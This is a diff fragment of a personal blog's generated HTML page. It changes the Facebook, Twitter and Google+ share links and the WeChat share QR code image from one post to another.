+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://tjuyjn.top/2019/09/25/杂篇/" data-title=" Facebook">
           <i class="icon icon-facebook"></i>
         </a>
       </li>
       
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CheckIn》 — Anti-entropy's blog&url=https://tjuyjn.top/2019/08/19/CheckIn/&via=https://tjuyjn.top" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《杂篇》 — Anti-entropy's blog&url=https://tjuyjn.top/2019/09/25/杂篇/&via=https://tjuyjn.top" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
       
       <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://tjuyjn.top/2019/08/19/CheckIn/" data-title=" Google+">
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://tjuyjn.top/2019/09/25/杂篇/" data-title=" Google+">
           <i class="icon icon-google-plus"></i>
         </a>
       </li>
@@ -634,7 +631,7 @@
 <div class="page-modal wx-share" id="wxShare">
     <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABv0lEQVR42u3awW7DIBAE0Pz/T7tSr23o7K4hrvQ4RZGFny8jGHi94nF9j5//VP9fP3PbwMXFHXOv5UhellCS+dfP4OLinueuwyuPrfXH5M+8/R8XF/dh3F4k5XPi4uL+R+69Wx1cXNznc/N4Wi9ckuLj0F4NFxd3wK0Wpjt+b+x3cXFxi9yrOPIZqmEXvR0XF/cIN5k02epUt1LV45nCRLi4uNu4veOTyeHKOhxxcXHPc6vXsKoHqNWPzIMVFxd3B7dakuaf1Gsz/qDj4uIe5PaCrFqC9DY8v7Q4uLi4R7jJ8iI/Fu0VJdGGBxcX9wh30jb0TkJ7179wcXGfxs2blWqQJe8tzICLi3uEOy9Se4undwGHi4t7hpsfiPaCLL+GFUUhLi7uEe7u7UoebYXjHFxc3M3cJFAmEdZbZ+Hi4j6Bu688nZQjuLi4n+VOLk5Vly95LVI+pcHFxb2J26tK913Suq3fxcXFHXMnr88vZCSfHc2Pi4t7kDupO/NrE0mCRv0uLi7uY7j50mS+2nobkbi4uI/n9gqXPLZwcXE/y51cj6guj/LNz6gWwcXFHXB7hWlSYVSLj0l04uLi3sT9AsFhTdQQYfj2AAAAAElFTkSuQmCC" alt="微信分享二维码">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABz0lEQVR42u3aS47DIBAFwNz/0h5pVlmMmdc0EEcqVpFl4SKLVn94veJ1/a7qO+9PrreV7zm5cHFx29xruMbvjPcZHyPZ/48j4eLiHuSOA1MOvXtSPdLtc1xc3Idx89yjSsTFxf12bhLgxnRcXNxv4SbFT7J1/uHttRouLm6DW22Y7vi9sb+Li4tb5F7FlYenvBAqfB0XF/cIt9PErJY3cyPbKCPDxcVdyk0KjDwY5TnJghQHFxd3G3fcnugMS5ILFnnSg4uLe5I7TlCSQFZ9snjmg4uLu4E7R0ySlbyZkgc7XFzck9xqoEkSlCQ9ak1+cHFxt3E7VyWScihPjKJ9cHFxD3LzhKM1sZm6U1GIhbi4uIu4+QA1P0Z1BDtZ/ODi4m7mziUf+XClejmj8I/i4uJu4HaCTh7gOgXPbQjDxcU9yJ27NtEf0EblEy4u7hFuZ9yyYHqztL2Ci4u7insVVzKazfcpN1ZwcXGPcPshbG3hVOjl4OLibub22xlz05vJQIaLi3uQm6Qv+QikX2n90zbFxcV9DDdpm+ZXr/KSaTKQ4eLiPoabB7K8+YKLi/spbh5uOp/Ph7K338LFxT3CbZUiU1crkkZqi46LizvP/QG/8Cn4YkLDRgAAAABJRU5ErkJggg==" alt="微信分享二维码">
 </div>
 
 
